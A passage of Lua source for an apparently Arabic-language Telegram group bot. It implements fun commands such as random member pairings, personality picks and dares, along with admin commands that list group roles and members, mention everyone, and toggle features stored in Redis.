{text = uass, url = "https://t.me/"..ban.username..""}, 
},
{
{text = news, url = "https://t.me/"..ban.username..""}, 
},
{
{text = banhas, url = "https://t.me/"..ban.username..""}, 
},
{
{text = rengk, url = "https://t.me/"..ban.username..""}, 
},
{
{text = masha, url = "https://t.me/"..ban.username..""}, 
},
{
{text = BIO, url = "https://t.me/"..ban.username..""}, 
},
}
}
return bot.sendText(msg.chat_id, msg.id, again, 'md', false, false, false, false, reply_markup)
end

if text == 'ثنائي' then
if not redis:get(bot_id.."thnaee"..msg.chat_id) then
return bot.sendText(msg.chat_id,msg.id," • الثنائي معطل من قبل المشرفين","md",true)
end
time = os.date("*t")
hour = time.hour
min = time.min
sec = time.sec
local_time = hour..":"..min
local Info_Members = bot.searchChatMembers(msg.chat_id, "*", 40)
local List = Info_Members.members
local Zozne = List[math.random(#List)] 
local data = bot.getUser(Zozne.member_id.user_id)
tagname = data.first_name
tagname = tagname:gsub("]","") 
tagname = tagname:gsub("[[]","") 
local Zozn = List[math.random(#List)] 
local dataa = bot.getUser(Zozn.member_id.user_id)
tagnamee = dataa.first_name
tagnamee = tagnamee:gsub("]","") 
tagnamee = tagnamee:gsub("[[]","") 
Text = "["..tagname.."](tg://user?id="..Zozne.member_id.user_id..")"
Textt = "["..tagnamee.."](tg://user?id="..Zozn.member_id.user_id..")"
local Textx = " ثنائي اليوم \n↯︙"..Text.." + "..Textt.." = ❤"
bot.sendText(msg.chat_id,msg.id,Textx,"md",true)  
end
if text == 'شخصيتي' or text == 'حددي شخصيتي' or text == 'حدد شخصيتي' then

if not redis:get(bot_id.."shakse"..msg.chat_id) then
return bot.sendText(msg.chat_id,msg.id," • شخصيتي معطلة من قبل المشرفين","md",true)
end
local texting = {"عنيده", 
"متردده  ",
"خبيثة  ", 
"ايجابية ", 
"غامضة  ", 
"ضعيفة ", 
"كلاسيكية  ", 
"مسالمة  ", 
"حماسية ", 
"قيادية  ", 
"شكاك  ", 
"رومنسية  ",
"محفزة  ",
"متعاونة  ",
"اجتماعية  ",
"عصبية ",
"نرجسية  ",
"انطوائية  ",
"مظلومة  ",
} 
zezee = texting[math.random(#texting)]
local Jabwa = bot.getUser(msg.sender.user_id)
local photo = bot.getUserProfilePhotos(msg.sender.user_id)
local news = 'شخصيتك : '..zezee
if photo.total_count > 0 then
data = {} 
data.inline_keyboard = {
{
{text =news,url = "https://t.me/"..Jabwa.username..""}, 
},
}
local msgg = msg.id/2097152/0.5
https.request("https://api.telegram.org/bot"..Token.."/sendphoto?chat_id=" .. msg.chat_id .. "&photo="..photo.photos[1].sizes[#photo.photos[1].sizes].photo.remote.id.."&photo=".. URL.escape(news).."&reply_to_message_id="..msgg.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(data))
end
end

if text == 'لقبي' then
local StatusMember = bot.getChatMember(msg.chat_id,msg.sender.user_id)
if StatusMember.status.custom_title ~= "" then
Lakb = StatusMember.status.custom_title
else
Lakb = 'مشرف'
end
if (StatusMember.status.luatele == "chatMemberStatusCreator") then
return bot.sendText(msg.chat_id,msg.id,'\n*• لقبك ( '..Lakb..' )* ',"md",true)  
elseif (StatusMember.status.luatele == "chatMemberStatusAdministrator") then
return bot.sendText(msg.chat_id,msg.id,'\n*• لقبك ( '..Lakb..' )* ',"md",true)  
else
return bot.sendText(msg.chat_id,msg.id,'\n*• انت عضو في المجموعة* ',"md",true)  
end
end

if text == 'كشف البوت' or text == 'صلاحيات البوت' then 
if not Administrator(msg) then
return bot.sendText(msg.chat_id,msg.id,'\n*• هذا الامر يخص الادمن * ',"md",true)  
end
local StatusMember = bot.getChatMember(msg.chat_id,bot_id).status.luatele
if (StatusMember ~= "chatMemberStatusAdministrator") then
return bot.sendText(msg.chat_id,msg.id,'• البوت عضو في المجموعة ',"md",true) 
end
local GetMemberStatus = bot.getChatMember(msg.chat_id,bot_id).status
if GetMemberStatus.can_change_info then
change_info = '❬ ✔️ ❭' else change_info = '❬ ❌ ❭'
end
if GetMemberStatus.can_delete_messages then
delete_messages = '❬ ✔️ ❭' else delete_messages = '❬ ❌ ❭'
end
if GetMemberStatus.can_invite_users then
invite_users = '❬ ✔️ ❭' else invite_users = '❬ ❌ ❭'
end
if GetMemberStatus.can_pin_messages then
pin_messages = '❬ ✔️ ❭' else pin_messages = '❬ ❌ ❭'
end
if GetMemberStatus.can_restrict_members then
restrict_members = '❬ ✔️ ❭' else restrict_members = '❬ ❌ ❭'
end
if GetMemberStatus.can_promote_members then
promote = '❬ ✔️ ❭' else promote = '❬ ❌ ❭'
end
PermissionsUser = '*\n• صلاحيات البوت في المجموعة :\n━━━━━━━━━━━'..'\n• تغيير المعلومات : '..change_info..'\n• تثبيت الرسائل : '..pin_messages..'\n• اضافه مستخدمين : '..invite_users..'\n• مسح الرسائل : '..delete_messages..'\n• حظر المستخدمين : '..restrict_members..'\n• اضافه المشرفين : '..promote..'\n\n*'
return bot.sendText(msg.chat_id,msg.id,PermissionsUser,"md",true) 
end

if text == 'كشف المجموعه' or text == 'كشف المجموعة' or text == 'كشف المجموعة' then
if not Administrator(msg) then
return bot.sendText(msg.chat_id,msg.id,'\n*• هذا الامر يخص الادمن* ',"md",true)  
end
local Info_Members = bot.getSupergroupMembers(msg.chat_id, "Administrators", "*", 0, 200)
local List_Members = Info_Members.members
for k, v in pairs(List_Members) do
if Info_Members.members[k].status.luatele == "chatMemberStatusCreator" then
local UserInfo = bot.getUser(v.member_id.user_id)
if UserInfo.first_name ~= "" then
if UserInfo.username then
Creatorr = "*• مالك المجموعة : @"..UserInfo.username.."*\n"
else
Creatorr = "• مالك المجموعة : *["..UserInfo.first_name.."](tg://user?id="..UserInfo.id..")\n"
end
bot.sendText(msg.chat_id,msg.id,Creatorr,"md",true)  
end
end
end
local Info_Members = redis:smembers(bot_id..":"..msg.chat_id..":Status:Creator") 
if #Info_Members ~= 0 then
local ListMembers = '\n*• قائمه المالكين \n ━━━━━━━━━━━*\n'
for k, v in pairs(Info_Members) do
local UserInfo = bot.getUser(v)
if UserInfo and UserInfo.username and UserInfo.username ~= "" then
ListMembers = ListMembers.."*"..k.." - *[@"..UserInfo.username.."](tg://user?id="..v..")\n"
else
ListMembers = ListMembers.."*"..k.." -* ["..v.."](tg://user?id="..v..")\n"
end
end
bot.sendText(msg.chat_id, msg.id, ListMembers, 'md')
end
local Info_Members = redis:smembers(bot_id..":"..msg.chat_id..":Status:BasicConstructor") 
if #Info_Members ~= 0 then
local ListMembers = '\n*• قائمه المنشئين الاساسيين \n ━━━━━━━━━━━*\n'
for k, v in pairs(Info_Members) do
local UserInfo = bot.getUser(v)
if UserInfo and UserInfo.username and UserInfo.username ~= "" then
ListMembers = ListMembers.."*"..k.." - *[@"..UserInfo.username.."](tg://user?id="..v..")\n"
else
ListMembers = ListMembers.."*"..k.." -* ["..v.."](tg://user?id="..v..")\n"
end
end
bot.sendText(msg.chat_id, msg.id, ListMembers, 'md')
end
local Info_Members = redis:smembers(bot_id..":"..msg.chat_id..":Status:Constructor") 
if #Info_Members ~= 0 then
local ListMembers = '\n*• قائمه المنشئين  \n ━━━━━━━━━━━*\n'
for k, v in pairs(Info_Members) do
local UserInfo = bot.getUser(v)
if UserInfo and UserInfo.username and UserInfo.username ~= "" then
ListMembers = ListMembers.."*"..k.." - *[@"..UserInfo.username.."](tg://user?id="..v..")\n"
else
ListMembers = ListMembers.."*"..k.." -* ["..v.."](tg://user?id="..v..")\n"
end
end
bot.sendText(msg.chat_id, msg.id, ListMembers, 'md')
end
local Info_Members = redis:smembers(bot_id..":"..msg.chat_id..":Status:Owner") 
if #Info_Members ~= 0 then
local ListMembers = '\n*• قائمه المدراء  \n ━━━━━━━━━━━*\n'
for k, v in pairs(Info_Members) do
local UserInfo = bot.getUser(v)
if UserInfo and UserInfo.username and UserInfo.username ~= "" then
ListMembers = ListMembers.."*"..k.." - *[@"..UserInfo.username.."](tg://user?id="..v..")\n"
else
ListMembers = ListMembers.."*"..k.." -* ["..v.."](tg://user?id="..v..")\n"
end
end
bot.sendText(msg.chat_id, msg.id, ListMembers, 'md')
end
local Info_Members = redis:smembers(bot_id..":"..msg.chat_id..":Status:Administrator") 
if #Info_Members ~= 0 then
local ListMembers = '\n*• قائمه الادمنيه  \n ━━━━━━━━━━━*\n'
for k, v in pairs(Info_Members) do
local UserInfo = bot.getUser(v)
if UserInfo and UserInfo.username and UserInfo.username ~= "" then
ListMembers = ListMembers.."*"..k.." - *[@"..UserInfo.username.."](tg://user?id="..v..")\n"
else
ListMembers = ListMembers.."*"..k.." -* ["..v.."](tg://user?id="..v..")\n"
end
end
bot.sendText(msg.chat_id, msg.id, ListMembers, 'md')
end
local Info_Members = redis:smembers(bot_id..":"..msg.chat_id..":Status:Vips") 
if #Info_Members ~= 0 then
local ListMembers = '\n*• قائمه المميزين  \n ━━━━━━━━━━━*\n'
for k, v in pairs(Info_Members) do
local UserInfo = bot.getUser(v)
if UserInfo and UserInfo.username and UserInfo.username ~= "" then
ListMembers = ListMembers.."*"..k.." - *[@"..UserInfo.username.."](tg://user?id="..v..")\n"
else
ListMembers = ListMembers.."*"..k.." -* ["..v.."](tg://user?id="..v..")\n"
end
end
bot.sendText(msg.chat_id, msg.id, ListMembers, 'md')
end
end
if text == 'تاك للكل' or text == 'منشن للكل' then

if not redis:get(bot_id.."taggg"..msg.chat_id) then
return bot.sendText(msg.chat_id,msg.id," • المنشن معطل من قبل المشرفين","md",true)
end
if not Administrator(msg) then
return bot.sendText(msg.chat_id,msg.id,'\n*• هذا الامر يخص الادمن* ',"md",true)  
end
local Info_Members = bot.getSupergroupMembers(msg.chat_id, "Administrators", "*", 0, 200)
local List_Members = Info_Members.members
for k, v in pairs(List_Members) do
if Info_Members.members[k].status.luatele == "chatMemberStatusCreator" then
local UserInfo = bot.getUser(v.member_id.user_id)
if UserInfo.first_name ~= "" then
if UserInfo.username then
Creatorr = "*• مالك المجموعة : @"..UserInfo.username.."*\n"
else
Creatorr = "• مالك المجموعة : *["..UserInfo.first_name.."](tg://user?id="..UserInfo.id..")\n"
end
bot.sendText(msg.chat_id,msg.id,Creatorr,"md",true)  
end
end
end
local Info_Members = redis:smembers(bot_id..":"..msg.chat_id..":Status:Creator")
if #Info_Members ~= 0 then
local ListMembers = '\n*• قائمه المالكين \n ━━━━━━━━━━━*\n'
for k, v in pairs(Info_Members) do
local UserInfo = bot.getUser(v)
if UserInfo and UserInfo.username and UserInfo.username ~= "" then
ListMembers = ListMembers.."*"..k.." - *[@"..UserInfo.username.."](tg://user?id="..v..")\n"
else
ListMembers = ListMembers.."*"..k.." -* ["..v.."](tg://user?id="..v..")\n"
end
end
bot.sendText(msg.chat_id, msg.id, ListMembers, 'md')
end
local Info_Members = redis:smembers(bot_id..":"..msg.chat_id..":Status:BasicConstructor")
if #Info_Members ~= 0 then
local ListMembers = '\n*• قائمه المنشئين الاساسيين \n ━━━━━━━━━━━*\n'
for k, v in pairs(Info_Members) do
local UserInfo = bot.getUser(v)
if UserInfo and UserInfo.username and UserInfo.username ~= "" then
ListMembers = ListMembers.."*"..k.." - *[@"..UserInfo.username.."](tg://user?id="..v..")\n"
else
ListMembers = ListMembers.."*"..k.." -* ["..v.."](tg://user?id="..v..")\n"
end
end
bot.sendText(msg.chat_id, msg.id, ListMembers, 'md')
end
local Info_Members = redis:smembers(bot_id..":"..msg.chat_id..":Status:Constructor") 
if #Info_Members ~= 0 then
local ListMembers = '\n*• قائمه المنشئين  \n ━━━━━━━━━━━*\n'
for k, v in pairs(Info_Members) do
local UserInfo = bot.getUser(v)
if UserInfo and UserInfo.username and UserInfo.username ~= "" then
ListMembers = ListMembers.."*"..k.." - *[@"..UserInfo.username.."](tg://user?id="..v..")\n"
else
ListMembers = ListMembers.."*"..k.." -* ["..v.."](tg://user?id="..v..")\n"
end
end
bot.sendText(msg.chat_id, msg.id, ListMembers, 'md')
end
local Info_Members = redis:smembers(bot_id..":"..msg.chat_id..":Status:Owner") 
if #Info_Members ~= 0 then
local ListMembers = '\n*• قائمه المدراء  \n ━━━━━━━━━━━*\n'
for k, v in pairs(Info_Members) do
local UserInfo = bot.getUser(v)
if UserInfo and UserInfo.username and UserInfo.username ~= "" then
ListMembers = ListMembers.."*"..k.." - *[@"..UserInfo.username.."](tg://user?id="..v..")\n"
else
ListMembers = ListMembers.."*"..k.." -* ["..v.."](tg://user?id="..v..")\n"
end
end
bot.sendText(msg.chat_id, msg.id, ListMembers, 'md')
end
local Info_Members = redis:smembers(bot_id..":"..msg.chat_id..":Status:Administrator") 
if #Info_Members ~= 0 then
local ListMembers = '\n*• قائمه الادمنيه  \n ━━━━━━━━━━━*\n'
for k, v in pairs(Info_Members) do
local UserInfo = bot.getUser(v)
if UserInfo and UserInfo.username and UserInfo.username ~= "" then
ListMembers = ListMembers.."*"..k.." - *[@"..UserInfo.username.."](tg://user?id="..v..")\n"
else
ListMembers = ListMembers.."*"..k.." -* ["..v.."](tg://user?id="..v..")\n"
end
end
bot.sendText(msg.chat_id, msg.id, ListMembers, 'md')
end
local Info_Members = redis:smembers(bot_id..":"..msg.chat_id..":Status:Vips") 
if #Info_Members ~= 0 then
local ListMembers = '\n*• قائمه المميزين  \n ━━━━━━━━━━━*\n'
for k, v in pairs(Info_Members) do
local UserInfo = bot.getUser(v)
if UserInfo and UserInfo.username and UserInfo.username ~= "" then
ListMembers = ListMembers.."*"..k.." - *[@"..UserInfo.username.."](tg://user?id="..v..")\n"
else
ListMembers = ListMembers.."*"..k.." -* ["..v.."](tg://user?id="..v..")\n"
end
end
bot.sendText(msg.chat_id, msg.id, ListMembers, 'md')
end
local Info_Members = bot.searchChatMembers(msg.chat_id, "*", 200)
local List_Members = Info_Members.members
listall = '\n*• قائمه الاعضاء \n ━━━━━━━━━━━*\n'
for k, v in pairs(List_Members) do
local UserInfo = bot.getUser(v.member_id.user_id)
if UserInfo.username ~= "" then
listall = listall.."*"..k.." - @"..UserInfo.username.."*\n"
else
listall = listall.."*"..k.." -* ["..UserInfo.id.."](tg://user?id="..UserInfo.id..")\n"
end
end
bot.sendText(msg.chat_id,msg.id,listall,"md",true)  
end

if text == 'تاك للمتفاعلين' or text == 'منشن للمتفاعلين' or text == 'المتفاعلين' then
if not redis:get(bot_id.."taggg"..msg.chat_id) then
return bot.sendText(msg.chat_id,msg.id," • امر المتفاعلين معطل من قبل المشرفين","md",true)
end
if not Administrator(msg) then
return bot.sendText(msg.chat_id,msg.id,'\n*• هذا الامر يخص الادمن * ',"md",true)  
end

local Info_Members = bot.searchChatMembers(msg.chat_id, "*", 25)
local List_Members = Info_Members.members
listall = '\n*• قائمه المتفاعلين في المجموعة \n ━━━━━━━━━━━*\n'
for k, v in pairs(List_Members) do
local UserInfo = bot.getUser(v.member_id.user_id)
if UserInfo.username ~= "" then
listall = listall.."*"..k.." - @"..UserInfo.username.."*\n"
else
listall = listall.."*"..k.." -* ["..UserInfo.id.."](tg://user?id="..UserInfo.id..")\n"
end
end
bot.sendText(msg.chat_id,msg.id,listall,"md",true)  
end

if text == "تحدي" then
local Info_Members = bot.searchChatMembers(msg.chat_id, "*", 200)
local List = Info_Members.members
local Zozne = List[math.random(#List)] 
local data = bot.getUser(Zozne.member_id.user_id)
tagname = data.first_name
tagname = tagname:gsub("]","") 
tagname = tagname:gsub("[[]","") 
local Textinggt = {"تعترف له/ا بشي", "تقول له أو لها اسم امك", "تقول له او لها وين ساكن", "تقول كم عمرك", "تقول اسم ابوك", "تقول عمرك له", "تقول له كم مرا حبيت", "تقول له اسم سيارتك", "تقولين له اسم امك", "تقولين له انا احبك", "تقول له انت حيوان", "تقول اسمك الحقيقي له", "ترسله اخر صور", "تصور له وين جالس", "تعرف لها بشي", "ترسله كل فلوسك بالبوت", "تصور لها غرفتك", "تصور/ين عيونك وترسلها بالمجموعة", "ترسل سنابك او ترسلين سنابك", }
local Descriptioont = Textinggt[math.random(#Textinggt)]
Text = "اتحداك\n"..Descriptioont.." ↤ ["..tagname.."](tg://user?id="..Zozne.member_id.user_id..")"
bot.sendText(msg.chat_id,msg.id,Text,"md",true)
end 

if text == "زوجني" or text == "زوجيني" then
if not redis:get(bot_id.."zogne"..msg.chat_id) then
return bot.sendText(msg.chat_id,msg.id," • زوجيني معطل من قبل المشرفين","md",true)
end
local Info_Members = bot.searchChatMembers(msg.chat_id, "*", 200)
local List = Info_Members.members
local Zozne = List[math.random(#List)] 
local data = bot.getUser(Zozne.member_id.user_id)
tagname = data.first_name
tagname = tagname:gsub("]","") 
tagname = tagname:gsub("[[]","") 
Text = "جبنالك برنو ماملعوب بسركيه 🌚❤️\n["..tagname.."](tg://user?id="..Zozne.member_id.user_id..")"
bot.sendText(msg.chat_id,msg.id,Text,"md",true)
end 

if text == "اني منو" or text == 'منو اني' then
if not redis:get(bot_id.."anamen"..msg.chat_id) then
return bot.sendText(msg.chat_id,msg.id," • انا مين معطل من قبل المشرفين","md",true)
end
if msg.sender.user_id == tonumber(1342680269) then
bot.sendText(msg.chat_id,msg.id,"• انته العشق المبرمج مالتي 🍃♥️","md",true)
elseif msg.sender.user_id == tonumber(1342680269) then
bot.sendText(msg.chat_id,msg.id,"• المبرمج عبود 🥺♥️","md",true)
elseif devB(msg.sender.user_id) then
bot.sendText(msg.chat_id,msg.id,"• انت المطور الاساسي يقلبي🌚♥","md",true)
elseif programmer(msg) then
bot.sendText(msg.chat_id,msg.id,"• اطلق مطور ثانوي 🤩","md",true)
elseif developer(msg) then
bot.sendText(msg.chat_id,msg.id,"• احلى مطور 💚","md",true)
elseif Creator(msg) then
bot.sendText(msg.chat_id,msg.id,"• انتا مالك المجموعة ياقلبي 🥺","md",true)
elseif BasicConstructor(msg) then
bot.sendText(msg.chat_id,msg.id,"• انتا منشئ اساسي حلو 🥰","md",true)
elseif Constructor(msg) then
bot.sendText(msg.chat_id,msg.id,"• انتا منشئ 😊","md",true)
elseif Owner(msg) then
bot.sendText(msg.chat_id,msg.id,"• انتا مدير كبير 💗","md",true)
elseif Administrator(msg) then
bot.sendText(msg.chat_id,msg.id,"• انتا ادمن 🙂","md",true)
elseif Vips(msg) then
bot.sendText(msg.chat_id,msg.id,"• احلى مميز اشوفه ❤","md",true)
else 
bot.sendText(msg.chat_id,msg.id,"• انتا عضو بس 🥺🥺","md",true)
end 
end
if text == 'تفعيل اوامر النسب' or text == 'تفعيل النسب' then
if not Administrator(msg) then
return bot.sendText(msg.chat_id,msg.id,'\n*• هذا الامر يخص الادمن* ',"md",true)  
end
redis:set(bot_id.."nsab"..msg.chat_id,true) 
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*↯︙تم تفعيل  اوامر النسب *").by,"md",true)
end

if text == 'تعطيل اوامر النسب' or text == 'تعطيل النسب' then
if not Administrator(msg) then
return bot.sendText(msg.chat_id,msg.id,'\n*• هذا الامر يخص الادمن* ',"md",true)  
end
redis:del(bot_id.."nsab"..msg.chat_id) 
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*↯︙تم تعطيل  اوامر النسب *").by,"md",true)
end

if text == 'تفعيل نتزوج' then
if not Administrator(msg) then
return bot.sendText(msg.chat_id,msg.id,'\n*• هذا الامر يخص الادمن* ',"md",true)  
end
redis:set(bot_id.."ttzog"..msg.chat_id,true) 
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*↯︙تم تفعيل  تتزوجيني *").by,"md",true)
end

if text == 'تعطيل نتزوج' then
if not Administrator(msg) then
return bot.sendText(msg.chat_id,msg.id,'\n*• هذا الامر يخص الادمن* ',"md",true)  
end
redis:del(bot_id.."ttzog"..msg.chat_id) 
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*↯︙تم تعطيل  تتزوجيني *").by,"md",true)
end

if text == 'تفعيل زوجني' then
if not Administrator(msg) then
return bot.sendText(msg.chat_id,msg.id,'\n*• هذا الامر يخص الادمن* ',"md",true)  
end
redis:set(bot_id.."zogne"..msg.chat_id,true) 
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*↯︙تم تفعيل  زوجني *").by,"md",true)
end

if text == 'تعطيل زوجني' then
if not Administrator(msg) then
return bot.sendText(msg.chat_id,msg.id,'\n*• هذا الامر يخص الادمن* ',"md",true)  
end
redis:del(bot_id.."zogne"..msg.chat_id) 
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*↯︙تم تعطيل  زوجني *").by,"md",true)
end
if text == 'تفعيل الالعاب' then
if not Administrator(msg) then
return bot.sendText(msg.chat_id,msg.id,'\n*• هذا الامر يخص الادمن* ',"md",true)  
end
redis:set(bot_id.."Status:Games"..msg.chat_id,true) 
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*↯︙تم تفعيل الالعاب*").by,"md",true)
end
if text == 'تعطيل الالعاب' then
if not Administrator(msg) then
return bot.sendText(msg.chat_id,msg.id,'\n*• هذا الامر يخص الادمن* ',"md",true)  
end
redis:del(bot_id.."Status:Games"..msg.chat_id) 
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*↯︙تم تعطيل  الالعاب *").by,"md",true)
end
if text == 'تفعيل افتاري' then
if not Administrator(msg) then
return bot.sendText(msg.chat_id,msg.id,'\n*• هذا الامر يخص الادمن* ',"md",true)  
end
redis:set(bot_id.."aftare"..msg.chat_id,true) 
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*↯︙تم تفعيل  افتاري *").by,"md",true)
end
if text == 'تعطيل افتاري' then
if not Administrator(msg) then
return bot.sendText(msg.chat_id,msg.id,'\n*• هذا الامر يخص الادمن* ',"md",true)  
end
redis:del(bot_id.."aftare"..msg.chat_id) 
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*↯︙تم تعطيل  افتاري *").by,"md",true)
end
if text == 'تفعيل التسليه' or text == 'تفعيل تسليه' then
if not Administrator(msg) then
return bot.sendText(msg.chat_id,msg.id,'\n*• هذا الامر يخص الادمن* ',"md",true)  
end
redis:set(bot_id.."trfeh"..msg.chat_id,true) 
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*↯︙تم تفعيل  التسليه *").by,"md",true)
end
if text == 'تعطيل التسليه' or text == 'تعطيل تسليه' then
if not Administrator(msg) then
return bot.sendText(msg.chat_id,msg.id,'\n*• هذا الامر يخص الادمن* ',"md",true)  
end
redis:del(bot_id.."trfeh"..msg.chat_id) 
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*↯︙تم تعطيل  التسليه *").by,"md",true)
end
if text == 'تفعيل انا مين' then
if not Administrator(msg) then
return bot.sendText(msg.chat_id,msg.id,'\n*• هذا الامر يخص الادمن* ',"md",true)  
end
redis:set(bot_id.."anamen"..msg.chat_id,true) 
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*↯︙تم تفعيل  مين انا *").by,"md",true)
end
if text == 'تعطيل انا مين' then
if not Administrator(msg) then
return bot.sendText(msg.chat_id,msg.id,'\n*• هذا الامر يخص الادمن* ',"md",true)  
end
redis:del(bot_id.."anamen"..msg.chat_id) 
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*↯︙تم تعطيل  مين انا *").by,"md",true)
end
if text == 'تفعيل شبيهي' or TextMsg == 'تفعيل شبيهتي' then
if not Administrator(msg) then
return bot.sendText(msg.chat_id,msg.id,'\n*• هذا الامر يخص الادمن* ',"md",true)  
end
redis:set(bot_id.."shapeh"..msg.chat_id,true) 
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*↯︙تم تفعيل  شبيهي *").by,"md",true)
end
if text == 'تعطيل شبيهي' or TextMsg == 'تعطيل شبيهتي' then
if not Administrator(msg) then
return bot.sendText(msg.chat_id,msg.id,'\n*• هذا الامر يخص الادمن* ',"md",true)  
end
redis:del(bot_id.."shapeh"..msg.chat_id) 
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*↯︙تم تعطيل  شبيهي *").by,"md",true)
end
if text == 'تفعيل الانذارات' then
if not Administrator(msg) then
return bot.sendText(msg.chat_id,msg.id,'\n*• هذا الامر يخص الادمن* ',"md",true)  
end
redis:set(bot_id.."indar"..msg.chat_id,true) 
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*↯︙تم تفعيل  الانذارات *").by,"md",true)
end
if text == 'تعطيل الانذارات' then
if not Administrator(msg) then
return bot.sendText(msg.chat_id,msg.id,'\n*• هذا الامر يخص الادمن* ',"md",true)  
end
redis:del(bot_id.."indar"..msg.chat_id) 
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*↯︙تم تعطيل  الانذارات *").by,"md",true)
end
if text == 'تفعيل شخصيتي' then
if not Administrator(msg) then
return bot.sendText(msg.chat_id,msg.id,'\n*• هذا الامر يخص الادمن* ',"md",true)  
end
redis:set(bot_id.."shakse"..msg.chat_id,true) 
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*↯︙تم تفعيل  شخصيتي *").by,"md",true)
end
if text == 'تعطيل شخصيتي' then
if not Administrator(msg) then
return bot.sendText(msg.chat_id,msg.id,'\n*• هذا الامر يخص الادمن* ',"md",true)  
end
redis:del(bot_id.."shakse"..msg.chat_id) 
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*↯︙تم تعطيل  شخصيتي *").by,"md",true)
end
if text == 'تفعيل ثنائي' or TextMsg == 'تفعيل الثنائي' then
if not Administrator(msg) then
return bot.sendText(msg.chat_id,msg.id,'\n*• هذا الامر يخص الادمن* ',"md",true)  
end
redis:set(bot_id.."thnaee"..msg.chat_id,true) 
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*↯︙تم تفعيل  الثنائي *").by,"md",true)
end
if text == 'تعطيل ثنائي' or TextMsg == 'تعطيل الثنائي' then
if not Administrator(msg) then
return bot.sendText(msg.chat_id,msg.id,'\n*• هذا الامر يخص الادمن* ',"md",true)  
end
redis:del(bot_id.."thnaee"..msg.chat_id) 
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*↯︙تم تعطيل  الثنائي *").by,"md",true)
end
if text == 'تفعيل اليوتيوب' or text == 'تفعيل يوتيوب' then
if not Administrator(msg) then
return bot.sendText(msg.chat_id,msg.id,'\n*• هذا الامر يخص الادمن* ',"md",true)  
end
redis:set(bot_id.."youutube"..msg.chat_id,true) 
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*↯︙تم تفعيل  اليوتيوب *").by,"md",true)
end
if text == 'تعطيل اليوتيوب' or text == 'تعطيل يوتيوب' then
if not Administrator(msg) then
return bot.sendText(msg.chat_id,msg.id,'\n*• هذا الامر يخص الادمن* ',"md",true)  
end
redis:del(bot_id.."youutube"..msg.chat_id) 
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*↯︙تم تعطيل  اليوتيوب *").by,"md",true)
end
if text == 'تفعيل ضع رتبه' then
if not Administrator(msg) then
return bot.sendText(msg.chat_id,msg.id,'\n*• هذا الامر يخص الادمن* ',"md",true)  
end
redis:set(bot_id.."redis:setRt"..msg.chat_id,true) 
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*↯︙تم تفعيل  ضع رتبه *").by,"md",true)
end
if text == 'تعطيل ضع رتبه' then
if not Administrator(msg) then
return bot.sendText(msg.chat_id,msg.id,'\n*• هذا الامر يخص الادمن* ',"md",true)  
end
redis:del(bot_id.."redis:setRt"..msg.chat_id) 
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*↯︙تم تعطيل  ضع رتبه *").by,"md",true)
end
if text == 'تفعيل التاك' then
if not Administrator(msg) then
return bot.sendText(msg.chat_id,msg.id,'\n*• هذا الامر يخص الادمن* ',"md",true)  
end
redis:set(bot_id.."taggg"..msg.chat_id,true) 
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*↯︙تم تفعيل  التاك *").by,"md",true)
end
if text == 'تعطيل التاك' then
if not Administrator(msg) then
return bot.sendText(msg.chat_id,msg.id,'\n*• هذا الامر يخص الادمن* ',"md",true)  
end
redis:del(bot_id.."taggg"..msg.chat_id) 
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*↯︙تم تعطيل  التاك *").by,"md",true)
end
if text == 'تفعيل الرابط' then
if not Administrator(msg) then
return bot.sendText(msg.chat_id,msg.id,'\n*• هذا الامر يخص الادمن* ',"md",true)  
end
redis:set(bot_id.."Status:Link"..msg.chat_id,true) 
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*↯︙تم تفعيل  الرابط *").by,"md",true)
end
if text == 'تعطيل الرابط' then
if not Administrator(msg) then
return bot.sendText(msg.chat_id,msg.id,'\n*• هذا الامر يخص الادمن* ',"md",true)  
end
redis:del(bot_id.."Status:Link"..msg.chat_id) 
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*↯︙تم تعطيل  الرابط *").by,"md",true)
end
if text == 'تفعيل نزلني' then
if not Administrator(msg) then
return bot.sendText(msg.chat_id,msg.id,'\n*• هذا الامر يخص الادمن* ',"md",true)  
end
redis:set(bot_id.."Abs:Nzlne:Abs"..msg.chat_id,true) 
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*↯︙تم تفعيل  نزلني *").by,"md",true)
end
if text == 'تعطيل نزلني' then
if not Administrator(msg) then
return bot.sendText(msg.chat_id,msg.id,'\n*• هذا الامر يخص الادمن* ',"md",true)  
end
